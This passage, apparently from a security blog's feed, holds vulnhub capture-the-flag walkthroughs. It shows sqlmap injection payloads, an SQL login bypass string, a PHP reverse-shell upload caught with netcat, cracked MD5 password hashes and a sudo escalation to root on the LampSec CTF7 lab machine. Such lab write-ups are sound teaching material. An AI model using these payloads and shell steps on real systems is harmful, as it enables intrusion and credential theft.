testing &#x27;AND boolean-based blind - WHERE or HAVING clause (MySQL comment)&#x27;[15:17:06] [INFO] testing &#x27;OR boolean-based blind - WHERE or HAVING clause (MySQL comment)&#x27;[15:17:07] [INFO] testing &#x27;OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)&#x27;[15:17:07] [INFO] testing &#x27;MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause&#x27;                                                                                        [15:17:07] [INFO] POST parameter &#x27;name&#x27; appears to be &#x27;MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause&#x27; injectable (with --string=&quot;to&quot;)                            [15:17:07] [INFO] testing &#x27;MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)&#x27;                                                                         [15:17:07] [INFO] testing &#x27;MySQL &gt;= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)&#x27;                                                                                              [15:17:07] [INFO] testing &#x27;MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)&#x27;                                                                                     [15:17:07] [INFO] testing &#x27;MySQL &gt;= 5.5 OR error-based - WHERE or HAVING clause (EXP)&#x27;[15:17:07] [INFO] testing &#x27;MySQL &gt;= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)&#x27;                                                                             [15:17:07] [INFO] testing &#x27;MySQL &gt;= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)&#x27;[15:17:07] [INFO] testing &#x27;MySQL &gt;= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)&#x27;                                                                             [15:17:07] [INFO] testing &#x27;MySQL &gt;= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)&#x27;[15:17:07] [INFO] testing &#x27;MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)&#x27;                                                                                   [15:17:07] [INFO] testing &#x27;MySQL &gt;= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)&#x27;                                                                                    [15:17:07] [INFO] testing &#x27;MySQL &gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)&#x27;                                                                            [15:17:07] [INFO] testing &#x27;MySQL &gt;= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)&#x27;                                                                             [15:17:07] [INFO] testing &#x27;MySQL &gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)&#x27;                                                                               [15:17:07] [INFO] testing &#x27;MySQL &gt;= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)&#x27;                                                                                [15:17:07] [INFO] testing &#x27;MySQL &gt;= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)&#x27;                                                                                   [15:17:07] [INFO] POST parameter &#x27;name&#x27; is &#x27;MySQL &gt;= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)&#x27; injectable                                                       [15:17:07] [INFO] testing &#x27;MySQL inline queries&#x27;[15:17:07] [INFO] testing &#x27;MySQL &gt;= 5.0.12 stacked queries (comment)&#x27;[15:17:07] [INFO] testing &#x27;MySQL &gt;= 5.0.12 stacked queries&#x27;[15:17:07] [INFO] testing &#x27;MySQL &gt;= 5.0.12 stacked queries (query SLEEP - comment)&#x27;[15:17:07] [INFO] testing &#x27;MySQL &gt;= 5.0.12 stacked queries (query SLEEP)&#x27;[15:17:07] [INFO] testing &#x27;MySQL &lt; 5.0.12 stacked queries (BENCHMARK - comment)&#x27;[15:17:07] [INFO] testing &#x27;MySQL &lt; 5.0.12 stacked queries (BENCHMARK)&#x27;[15:17:07] [INFO] testing &#x27;MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)&#x27;[15:17:17] [INFO] POST parameter &#x27;name&#x27; appears to be &#x27;MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)&#x27; injectable                                                                           [15:17:17] [INFO] testing &#x27;Generic UNION query (NULL) - 1 to 20 columns&#x27;[15:17:17] [INFO] testing &#x27;MySQL UNION query (NULL) - 1 to 20 columns&#x27;[15:17:17] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found[15:17:17] [INFO] testing &#x27;MySQL UNION query (random number) - 1 to 20 columns&#x27;[15:17:17] [INFO] testing &#x27;MySQL UNION query (NULL) - 21 to 40 columns&#x27;[15:17:18] [INFO] testing &#x27;MySQL UNION query (random number) - 21 to 40 columns&#x27;[15:17:18] [INFO] testing &#x27;MySQL UNION query (NULL) - 41 to 60 columns&#x27;[15:17:18] [INFO] testing &#x27;MySQL UNION query (random number) - 41 to 60 columns&#x27;[15:17:18] [INFO] testing &#x27;MySQL UNION query (NULL) - 61 to 80 columns&#x27;[15:17:18] [INFO] testing &#x27;MySQL UNION query (random number) - 61 to 80 columns&#x27;[15:17:18] [INFO] testing &#x27;MySQL UNION query (NULL) - 81 to 100 columns&#x27;[15:17:18] [INFO] testing &#x27;MySQL UNION query (random number) - 81 to 100 columns&#x27;POST parameter &#x27;name&#x27; is vulnerable. Do you want to keep testing the others (if any)? [y/N] sqlmap identified the following injection point(s) with a total of 396 HTTP(s) requests:---Parameter: name (POST)    Type: boolean-based blind    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause    Payload: name=1&#x27; RLIKE (SELECT (CASE WHEN (3453=3453) THEN 1 ELSE 0x28 END))-- fkrZ&amp;email=&amp;phone=&amp;org=    Type: error-based    Title: MySQL &gt;= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)    Payload: name=1&#x27; AND ROW(9202,7421)&gt;(SELECT COUNT(*),CONCAT(0x716b766271,(SELECT (ELT(9202=9202,1))),0x7171627a71,FLOOR(RAND(0)*2))x FROM (SELECT 5809 UNION SELECT 6254 UNION SELECT 2907 UNION SELECT 3295)a GROUP BY x)-- lorR&amp;email=&amp;phone=&amp;org=    Type: time-based blind    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)    Payload: name=1&#x27; AND (SELECT 6598 FROM (SELECT(SLEEP(5)))WnCm)-- cXmx&amp;email=&amp;phone=&amp;org=---[15:17:23] [INFO] the back-end DBMS is MySQLweb server operating system: Linux Fedora 6 or 8 or 7 (Moonshine or Zod or Werewolf)web application technology: Apache 2.2.6, PHP 5.2.4back-end DBMS: MySQL &gt;= 4.1[15:17:23] [INFO] fetched data logged to text files under &#x27;/root/.local/share/sqlmap/output/192.168.56.139&#x27;                                                                                     [*] ending @ 15:17:23 /2023-04-27/\n\n可惜获得的凭证只能用于登录blog页面，并不能登录后台以及ssh连接，价值不大。\n","categories":["vulnhub"],"tags":["walkthrough"]},{"title":"[vulnhub]  LampSec-CTF7","url":"/2023/05/23/LampSec:%20CTF7/","content":"\n\n\n靶机部署这台机子将其网卡设置为eth0。实际上的网卡是eth1。因此，我们需要删除配置文件&#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-eth0，并创建一个名为ifcfg-eth1的新文件。必须写在文件中的设置是ONBOOT=yes BOOTPROTO=dhcp DEVICE=eth1 #要配置的网卡名。然后service network restart就可以了。(在Cent OS 6中, 在大于等于7的版本应该使用systemctl)其实之后最好把靶机丢到vm里面选择已经移动别选复制，这样容易保障网络环境配置不出问题。\n信息收集┌──(kali㉿kali)-[~/vulnhub/LampSecurity/ctf7/workSpace]└─$ sudo nmap -sn 192.168.56.0/24[sudo] password for kali: Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-02 20:29 CSTNmap scan report for 192.168.56.1Host is up (0.0014s latency).MAC Address: 00:50:56:C0:00:08 (VMware)Nmap scan report for 192.168.56.2Host is up (0.0010s latency).MAC Address: 00:50:56:EC:CE:9E (VMware)Nmap scan report for 192.168.56.141Host is up (0.00089s latency).MAC Address: 00:0C:29:AC:12:E4 (VMware)Nmap scan report for 192.168.56.254Host is up (0.00060s latency).MAC Address: 00:50:56:E6:06:A3 (VMware)Nmap scan report for 192.168.56.132Host is up.Nmap done: 256 IP addresses (5 hosts up) scanned in 2.02 seconds\n\n┌──(kali㉿kali)-[~/vulnhub/LampSecurity/ctf7/workSpace]└─$ sudo nmap -p- --min-rate=10000 192.168.56.141Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-02 20:30 CSTNmap scan report for 192.168.56.141Host is up (0.0011s latency).Not shown: 65507 filtered tcp ports (no-response), 19 filtered tcp ports (host-prohibited)PORT      STATE  SERVICE22/tcp    open   ssh80/tcp    open   http137/tcp   closed netbios-ns138/tcp   closed netbios-dgm139/tcp   open   netbios-ssn901/tcp   open   samba-swat5900/tcp  closed vnc8080/tcp  open   http-proxy10000/tcp open   snet-sensor-mgmtMAC Address: 00:0C:29:AC:12:E4 (VMware)Nmap done: 1 IP address (1 host up) scanned in 13.48 seconds\n\n还开了挺多端口的，80，8080，139，10000都可以看看。\n┌──(kali㉿kali)-[~/vulnhub/LampSecurity/ctf7/workSpace]└─$ sudo nmap -sU -p- --min-rate=10000 192.168.56.141Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-02 20:39 CSTWarning: 192.168.56.141 giving up on port because retransmission cap hit (10).Nmap scan report for 192.168.56.141Host is up (0.0019s latency).All 65535 scanned ports on 192.168.56.141 are in ignored states.Not shown: 65457 open|filtered udp ports (no-response), 78 filtered udp ports (host-prohibited)MAC Address: 00:0C:29:AC:12:E4 (VMware)Nmap done: 1 IP address (1 host up) scanned in 72.81 seconds\n\n┌──(kali㉿kali)-[~/vulnhub/LampSecurity/ctf7/workSpace]└─$ sudo nmap -sT -sV -O -p22,80,137,138,139,901,5900,8080,10000 192.168.56.141Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-02 20:47 CSTNmap scan report for 192.168.56.141Host is up (0.00058s latency).PORT      STATE  SERVICE     VERSION22/tcp    open   ssh         OpenSSH 5.3 (protocol 2.0)80/tcp    open   http        Apache httpd 2.2.15 ((CentOS))137/tcp   closed netbios-ns138/tcp   closed netbios-dgm139/tcp   open   netbios-ssn Samba smbd 3.X - 4.X (workgroup: MYGROUP)901/tcp   open   http        Samba SWAT administration server5900/tcp  closed vnc8080/tcp  open   http        Apache httpd 2.2.15 ((CentOS))10000/tcp open   http        MiniServ 1.610 (Webmin httpd)MAC Address: 00:0C:29:AC:12:E4 (VMware)Device type: general purposeRunning: Linux 2.6.X|3.XOS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3OS details: Linux 2.6.32 - 3.13Network Distance: 1 hopOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 43.12 seconds\n\n趁其它还在扫描的时间先看看80端口吧。\nEXPLOITweb先目录发现一下，扫描的同时自己手动看看网页。\n┌──(kali㉿kali)-[~/vulnhub/LampSecurity/ctf7/workSpace]└─$ sudo dirb http://192.168.56.141                                                                                [sudo] password for kali: -----------------DIRB v2.22    By The Dark Raver-----------------START_TIME: Tue May  2 22:34:27 2023URL_BASE: http://192.168.56.141/WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt-----------------\n\n随便点点，发现有几个可以输入注册的地方，以及8080端口是个登录页面。\nSQLi加点&#39;看看有何反应。OK，存在sql注入漏洞。之后看看是否用sqlmap把库dump出来看看。再在登录页面试试。\n# 192.168.56.141:8080admin&#x27;) or 1=1 #-- -\n\n竟然直接登进来了。\n文件上传ok，不过一时间看不出是什么cms，那就找找有无什么可以上传文件的地方呗。\n幸运的是我们找到了可以传文件的地方\n我们尝试利用文件上传\nSeems that the &lt;?and?&gt; are filtered. However, even if we try to bypass the filter like &lt;sript language=&quot;php&quot;&gt;payload&lt;/script&gt;, the payload just doesn’t work.\nAs a result, we must find the path of the uploaded shell. \nOh, don’t forget we did web content discovery and it was done for sure. So let us take a look at it.\n┌──(kali㉿kali)-[~/vulnhub/LampSecurity/ctf7/workSpace]└─$ sudo dirb http://192.168.56.141                                                                                [sudo] password for kali: -----------------DIRB v2.22    By The Dark Raver-----------------START_TIME: Tue May  2 22:34:27 2023URL_BASE: http://192.168.56.141/WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt-----------------GENERATED WORDS: 4612                                                          ---- Scanning URL: http://192.168.56.141/ ----+ http://192.168.56.141/about (CODE:200|SIZE:4910)                                                                          ==&gt; DIRECTORY: http://192.168.56.141/assets/                                                                                + http://192.168.56.141/backups (CODE:301|SIZE:333)                                                                         + http://192.168.56.141/cgi-bin/ (CODE:403|SIZE:290)                                                                        + http://192.168.56.141/contact (CODE:200|SIZE:5017)                                                                        ==&gt; DIRECTORY: http://192.168.56.141/css/                                                                                   + http://192.168.56.141/db (CODE:200|SIZE:3904)                                                                             + http://192.168.56.141/default (CODE:200|SIZE:6058)                                                                        + http://192.168.56.141/footer (CODE:200|SIZE:3904)                                                                         + http://192.168.56.141/header (CODE:200|SIZE:3904)                                                                         ==&gt; DIRECTORY: http://192.168.56.141/img/                                                                                   ==&gt; DIRECTORY: http://192.168.56.141/inc/                                                                                   + http://192.168.56.141/index.php (CODE:200|SIZE:6058)                                                                      ==&gt; DIRECTORY: http://192.168.56.141/js/                                                                                    + http://192.168.56.141/newsletter (CODE:200|SIZE:4037)                                                                     + http://192.168.56.141/phpinfo (CODE:200|SIZE:58762)                                                                       + http://192.168.56.141/profile (CODE:200|SIZE:3977)                                                                        + http://192.168.56.141/read (CODE:302|SIZE:1)                                                                              + http://192.168.56.141/recovery (CODE:200|SIZE:4807)                                                                       + http://192.168.56.141/register (CODE:200|SIZE:6591)                                                                       + http://192.168.56.141/signup (CODE:200|SIZE:4783)                                                                         + http://192.168.56.141/usage (CODE:403|SIZE:287)                                                                           ==&gt; DIRECTORY: http://192.168.56.141/webalizer/                                                                             ==&gt; DIRECTORY: http://192.168.56.141/webmail/                                                                                                                                                                                                           ---- Entering directory: http://192.168.56.141/assets/ ----(!) WARNING: Directory IS LISTABLE. No need to scan it.                            (Use mode &#x27;-w&#x27; if you want to scan it anyway)                                                                                                                            ---- Entering directory: http://192.168.56.141/css/ ----(!) WARNING: Directory IS LISTABLE. No need to scan it.                            (Use mode &#x27;-w&#x27; if you want to scan it anyway)                                                                                                                            ---- Entering directory: http://192.168.56.141/img/ ----(!) WARNING: Directory IS LISTABLE. No need to scan it.                            (Use mode &#x27;-w&#x27; if you want to scan it anyway)                                                                                                                            ---- Entering directory: http://192.168.56.141/inc/ ----(!) WARNING: Directory IS LISTABLE. No need to scan it.                            (Use mode &#x27;-w&#x27; if you want to scan it anyway)                                                                                                                            ---- Entering directory: http://192.168.56.141/js/ ----(!) WARNING: Directory IS LISTABLE. No need to scan it.                            (Use mode &#x27;-w&#x27; if you want to scan it anyway)                                                                                                                            ---- Entering directory: http://192.168.56.141/webalizer/ ----+ http://192.168.56.141/webalizer/index.html (CODE:200|SIZE:3671)                                                                                                                                                                                       ---- Entering directory: http://192.168.56.141/webmail/ ----+ http://192.168.56.141/webmail/bin (CODE:403|SIZE:293)                                                                     + http://192.168.56.141/webmail/config (CODE:403|SIZE:296)                                                                  + http://192.168.56.141/webmail/favicon.ico (CODE:200|SIZE:1150)                                                            + http://192.168.56.141/webmail/index.php (CODE:200|SIZE:5157)                                                              ==&gt; DIRECTORY: http://192.168.56.141/webmail/installer/                                                                     + http://192.168.56.141/webmail/LICENSE (CODE:403|SIZE:297)                                                                 + http://192.168.56.141/webmail/logs (CODE:403|SIZE:294)                                                                    ==&gt; DIRECTORY: http://192.168.56.141/webmail/plugins/                                                                       ==&gt; DIRECTORY: http://192.168.56.141/webmail/program/                                                                       + http://192.168.56.141/webmail/README (CODE:403|SIZE:296)                                                                  + http://192.168.56.141/webmail/robots.txt (CODE:200|SIZE:26)                                                               ==&gt; DIRECTORY: http://192.168.56.141/webmail/skins/                                                                         + http://192.168.56.141/webmail/SQL (CODE:403|SIZE:293)                                                                     + http://192.168.56.141/webmail/temp (CODE:403|SIZE:294)                                                                                                                                                                                                ---- Entering directory: http://192.168.56.141/webmail/installer/ ----==&gt; DIRECTORY: http://192.168.56.141/webmail/installer/images/                                                              + http://192.168.56.141/webmail/installer/index.php (CODE:302|SIZE:0)                                                                                                                                                                                   ---- Entering directory: http://192.168.56.141/webmail/plugins/ ----==&gt; DIRECTORY: http://192.168.56.141/webmail/plugins/archive/                                                               ==&gt; DIRECTORY: http://192.168.56.141/webmail/plugins/emoticons/                                                             ==&gt; DIRECTORY: http://192.168.56.141/webmail/plugins/help/                                                                  ==&gt; DIRECTORY: http://192.168.56.141/webmail/plugins/password/                                                              ==&gt; DIRECTORY: http://192.168.56.141/webmail/plugins/userinfo/                                                                                                                                                                                          ---- Entering directory: http://192.168.56.141/webmail/program/ ----(!) WARNING: All responses for this directory seem to be CODE = 403.                                                            (Use mode &#x27;-w&#x27; if you want to scan it anyway)                                                                                                                            ---- Entering directory: http://192.168.56.141/webmail/skins/ ----==&gt; DIRECTORY: http://192.168.56.141/webmail/skins/classic/                                                                                                                                                                                             ---- Entering directory: http://192.168.56.141/webmail/installer/images/ ----                                                                                                                            ---- Entering directory: http://192.168.56.141/webmail/plugins/archive/ ----==&gt; DIRECTORY: http://192.168.56.141/webmail/plugins/archive/skins/                                                                                                                                                                                     ---- Entering directory: http://192.168.56.141/webmail/plugins/emoticons/ ----                                                                                                                            ---- Entering directory: http://192.168.56.141/webmail/plugins/help/ ----==&gt; DIRECTORY: http://192.168.56.141/webmail/plugins/help/content/                                                          ==&gt; DIRECTORY: http://192.168.56.141/webmail/plugins/help/skins/                                                                                                                                                                                        ---- Entering directory: http://192.168.56.141/webmail/plugins/password/ ----==&gt; DIRECTORY: http://192.168.56.141/webmail/plugins/password/drivers/                                                      ==&gt; DIRECTORY: http://192.168.56.141/webmail/plugins/password/helpers/                                                      + http://192.168.56.141/webmail/plugins/password/README (CODE:200|SIZE:10645)                                                                                                                                                                           ---- Entering directory: http://192.168.56.141/webmail/plugins/userinfo/ ----                                                                                                                            ---- Entering directory: http://192.168.56.141/webmail/skins/classic/ ----==&gt; DIRECTORY: http://192.168.56.141/webmail/skins/classic/images/                                                          ==&gt; DIRECTORY: http://192.168.56.141/webmail/skins/classic/includes/                                                        + http://192.168.56.141/webmail/skins/classic/README (CODE:200|SIZE:855)                                                    ==&gt; DIRECTORY: http://192.168.56.141/webmail/skins/classic/templates/                                                                                                                                                                                   ---- Entering directory: http://192.168.56.141/webmail/plugins/archive/skins/ ----==&gt; DIRECTORY: http://192.168.56.141/webmail/plugins/archive/skins/classic/                                                                                                                                                                             ---- Entering directory: http://192.168.56.141/webmail/plugins/help/content/ ----                                                                                                                            ---- Entering directory: http://192.168.56.141/webmail/plugins/help/skins/ ----==&gt; DIRECTORY: http://192.168.56.141/webmail/plugins/help/skins/classic/                                                                                                                                                                                ---- Entering directory: http://192.168.56.141/webmail/plugins/password/drivers/ ----                                                                                                                            ---- Entering directory: http://192.168.56.141/webmail/plugins/password/helpers/ ----                                                                                                                            ---- Entering directory: http://192.168.56.141/webmail/skins/classic/images/ ----==&gt; DIRECTORY: http://192.168.56.141/webmail/skins/classic/images/buttons/                                                  ==&gt; DIRECTORY: http://192.168.56.141/webmail/skins/classic/images/display/                                                  + http://192.168.56.141/webmail/skins/classic/images/favicon.ico (CODE:200|SIZE:1150)                                       ==&gt; DIRECTORY: http://192.168.56.141/webmail/skins/classic/images/icons/                                                                                                                                                                                ---- Entering directory: http://192.168.56.141/webmail/skins/classic/includes/ ----                                                                                                                            ---- Entering directory: http://192.168.56.141/webmail/skins/classic/templates/ ----                                                                                                                            ---- Entering directory: http://192.168.56.141/webmail/plugins/archive/skins/classic/ ----                                                                                                                            ---- Entering directory: http://192.168.56.141/webmail/plugins/help/skins/classic/ ----==&gt; DIRECTORY: http://192.168.56.141/webmail/plugins/help/skins/classic/templates/                                                                                                                                                                      ---- Entering directory: http://192.168.56.141/webmail/skins/classic/images/buttons/ ----                                                                                                                            ---- Entering directory: http://192.168.56.141/webmail/skins/classic/images/display/ ----                                                                                                                            ---- Entering directory: http://192.168.56.141/webmail/skins/classic/images/icons/ ----                                                                                                                            ---- Entering directory: http://192.168.56.141/webmail/plugins/help/skins/classic/templates/ ----                                                                               /zt                                          -----------------END_TIME: Tue May  2 22:39:31 2023DOWNLOADED: 124624 - FOUND: 32\n\nAfter some munal try, we find out upload file in the path of 192.168.56.141/assets/.So we upload php-reverse-shell.And we curl our shell.php\n# curl http://192.168.56.141/assets/shell.php┌──(kali㉿kali)-[~/vulnhub/LampSecurity/ctf7/workSpace]└─$ sudo nc -lvp 443                                                           [sudo] password for kali: listening on [any] 443 ...192.168.56.141: inverse host lookup failed: Host name lookup failureconnect to [192.168.56.132] from (UNKNOWN) [192.168.56.141] 48031Linux localhost.localdomain 2.6.32-279.el6.i686 #1 SMP Fri Jun 22 10:59:55 UTC 2012 i686 i686 i386 GNU/Linux 17:37:14 up  2:45,  0 users,  load average: 0.00, 0.00, 0.00USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHATuid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0sh: no job control in this shellsh-4.1$ whoamiwhoamiapachesh-4.1$ pwd/pwdsh-4.1$ ip aip a1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 16436 qdisc noqueue state UNKNOWN     link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00    inet 127.0.0.1/8 scope host lo    inet6 ::1/128 scope host        valid_lft forever preferred_lft forever2: eth1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UNKNOWN qlen 1000    link/ether 00:0c:29:ac:12:e4 brd ff:ff:ff:ff:ff:ff    inet 192.168.56.141/24 brd 192.168.56.255 scope global eth1    inet6 fe80::20c:29ff:feac:12e4/64 scope link        valid_lft forever preferred_lft forever\n\nSucessfully get webshell.\nPrivilege Escalation先python spwan一个更稳定的shell。然后sudo -l需要密码，findsuid位文件没有能用的，cat /etc/crontab直接没有定时任务。OK。行吧，在上大招前先手工枚举一下吧。\nuname -a                                                                                     Linux localhost.localdomain 2.6.32-279.el6.i686 #1 SMP Fri Jun 22 10:59:55 UTC 2012 i686 i686 i386 GNU/Linux \n\n版本挺低的，还是经典2.6，可以考虑内核提权。但是优先级往后稍稍吧。\n配置文件查看cd到&#x2F;home目录下，发现很多用户，然而没有read权限，没用，查不了是否有用户遗留的登录凭证。那就看看网站配置文件啥的吧，找点前后端连接用到的密码。\nbash-4.1$ cat config.inc.phpcat config.inc.php&lt;?php/* * Generated configuration file * Generated by: phpMyAdmin 3.5.4 setup script * Date: Wed, 19 Dec 2012 09:01:38 -0500 *//* Servers configuration */$i = 0;/* Server: localhost [1] */$i++;$cfg[&#x27;Servers&#x27;][$i][&#x27;verbose&#x27;] = &#x27;localhost&#x27;;$cfg[&#x27;Servers&#x27;][$i][&#x27;host&#x27;] = &#x27;localhost&#x27;;$cfg[&#x27;Servers&#x27;][$i][&#x27;port&#x27;] = &#x27;&#x27;;$cfg[&#x27;Servers&#x27;][$i][&#x27;socket&#x27;] = &#x27;&#x27;;$cfg[&#x27;Servers&#x27;][$i][&#x27;connect_type&#x27;] = &#x27;tcp&#x27;;$cfg[&#x27;Servers&#x27;][$i][&#x27;extension&#x27;] = &#x27;mysqli&#x27;;$cfg[&#x27;Servers&#x27;][$i][&#x27;nopassword&#x27;] = true;$cfg[&#x27;Servers&#x27;][$i][&#x27;auth_type&#x27;] = &#x27;cookie&#x27;;$cfg[&#x27;Servers&#x27;][$i][&#x27;user&#x27;] = &#x27;root&#x27;;$cfg[&#x27;Servers&#x27;][$i][&#x27;password&#x27;] = &#x27;&#x27;;$cfg[&#x27;Servers&#x27;][$i][&#x27;AllowNoPassword&#x27;] = TRUE;$cfg[&#x27;Servers&#x27;][$i][&#x27;AllowNoPasswordRoot&#x27;] = TRUE; /* End of servers configuration */$cfg[&#x27;blowfish_secret&#x27;] = &#x27;50d1c8ba084fd9.39888691&#x27;;$cfg[&#x27;DefaultLang&#x27;] = &#x27;en&#x27;;$cfg[&#x27;ServerDefault&#x27;] = 1;$cfg[&#x27;UploadDir&#x27;] = &#x27;&#x27;;$cfg[&#x27;SaveDir&#x27;] = &#x27;&#x27;;\n\n从网站config文件我们可以看到，数据root用户登录直接不用密码。那我之后可以登录一下数据库找点信息。\n敏感信息泄露再手动遍历了下网页目录，发现之前进不去的&#x2F;backups目录有个备份文件。我们查看一下，刚好最后几行记录了向数据库插入用户的账号密码等信息。\n/* /var/www/html/backups */LOCK TABLES `users` WRITE;/*!40000 ALTER TABLE `users` DISABLE KEYS */;INSERT INTO `users` VALUES (&#x27;webdev@localhost.localdomain&#x27;,&#x27;f7aa6066f95255096672e3a5fc537081&#x27;,1,NULL,13,&#x27;Developer account&#x27;,&#x27;Developer account for updating the site.&#x27;),(&#x27;brian@localhost.localdomain&#x27;,&#x27;d41d8cd98f00b204e9800998ecf8427e&#x27;,1,&#x27;2012-12-19 11:30:54&#x27;,3,&#x27;Brian Hershel&#x27;,&#x27;Brian is our technical brains behind the operations and a chief trainer.&#x27;),(&#x27;john@localhost.localdomain&#x27;,&#x27;0d9ff2a4396d6939f80ffe09b1280ee1&#x27;,1,NULL,4,&#x27;John Durham&#x27;,&#x27;&#x27;),(&#x27;alice@localhost.localdomain&#x27;,&#x27;2146bf95e8929874fc63d54f50f1d2e3&#x27;,1,NULL,5,&#x27;Alice Wonder&#x27;,&#x27;&#x27;),(&#x27;ruby@localhost.localdomain&#x27;,&#x27;9f80ec37f8313728ef3e2f218c79aa23&#x27;,0,NULL,6,&#x27;Ruby Spinster&#x27;,&#x27;&#x27;),(&#x27;leon@localhost.localdomain&#x27;,&#x27;5d93ceb70e2bf5daa84ec3d0cd2c731a&#x27;,0,NULL,7,&#x27;Leon Parnetta&#x27;,&#x27;&#x27;),(&#x27;julia@localhost.localdomain&#x27;,&#x27;ed2539fe892d2c52c42a440354e8e3d5&#x27;,0,NULL,8,&#x27;Julia Fields&#x27;,&#x27;&#x27;),(&#x27;michael@localhost.localdomain&#x27;,&#x27;9c42a1346e333a770904b2a2b37fa7d3&#x27;,0,NULL,9,&#x27;Michael Saint&#x27;,&#x27;&#x27;),(&#x27;bruce@localhost.localdomain&#x27;,&#x27;3a24d81c2b9d0d9aaf2f10c6c9757d4e&#x27;,0,NULL,10,&#x27;Bruce Pottricks&#x27;,&#x27;&#x27;),(&#x27;neil@localhost.localdomain&#x27;,&#x27;4773408d5358875b3764db552a29ca61&#x27;,0,NULL,11,&#x27;Neil Felstein&#x27;,&#x27;&#x27;),(&#x27;charles@localhost.localdomain&#x27;,&#x27;b2a97bcecbd9336b98d59d9324dae5cf&#x27;,0,NULL,12,&#x27;Charles Adams&#x27;,&#x27;&#x27;);/*!40000 ALTER TABLE `users` ENABLE KEYS */;\n\n我们提取一下登录凭证，把哈希值丢到crackstation。然后用得到的密码尝试直接ssh看看能不能成功登录。\nbrain:&#x27;&#x27;#竟然是md5的空值，草。webdev:&#x27;webdev&#x27;john:&#x27;transformersrule&#x27;\n\n试到第3个john的时候就成功了。\nbash-4.1$ su johnsu johnPassword: transformersrule[john@localhost backups]$ whoamiwhoamijohn[john@localhost backups]$ sudo -lsudo -l[sudo] password for john: transformersruleMatching Defaults entries for john on this host:    requiretty, !visiblepw, always_set_home, env_reset, env_keep=&quot;COLORS    DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS&quot;, env_keep+=&quot;MAIL PS1    PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE&quot;, env_keep+=&quot;LC_COLLATE    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES&quot;, env_keep+=&quot;LC_MONETARY    LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE&quot;, env_keep+=&quot;LC_TIME LC_ALL    LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY&quot;,    secure_path=/sbin\\:/bin\\:/usr/sbin\\:/usr/binUser john may run the following commands on this host:    (ALL) ALL[john@localhost backups]$ sudo susudo su[root@localhost backups]# whoamiwhoamiroot[root@localhost backups]# ip aip a1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 16436 qdisc noqueue state UNKNOWN     link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00    inet 127.0.0.1/8 scope host lo    inet6 ::1/128 scope host        valid_lft forever preferred_lft forever2: eth1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UNKNOWN qlen 1000    link/ether 00:0c:29:ac:12:e4 brd ff:ff:ff:ff:ff:ff    inet 192.168.56.141/24 brd 192.168.56.255 scope global eth1    inet6 fe80::20c:29ff:feac:12e4/64 scope link        valid_lft forever preferred_lft forever\n\n直接是sudo用户组的，直接提权成功。\n密码复用当然，我们也可以登录mysql数据库查看用户与密码。\n#mysql -uroot#show databases;#use users;#select * from users;mysql&gt; select username,password from users;select username,password from users;+-------------------------------+----------------------------------+| username                      | password                         |+-------------------------------+----------------------------------+| brian@localhost.localdomain   | e22f07b17f98e0d9d364584ced0e3c18 || john@localhost.localdomain    | 0d9ff2a4396d6939f80ffe09b1280ee1 || alice@localhost.localdomain   | 2146bf95e8929874fc63d54f50f1d2e3 || ruby@localhost.localdomain    | 9f80ec37f8313728ef3e2f218c79aa23 || leon@localhost.localdomain    | 5d93ceb70e2bf5daa84ec3d0cd2c731a || julia@localhost.localdomain   | ed2539fe892d2c52c42a440354e8e3d5 || michael@localhost.localdomain | 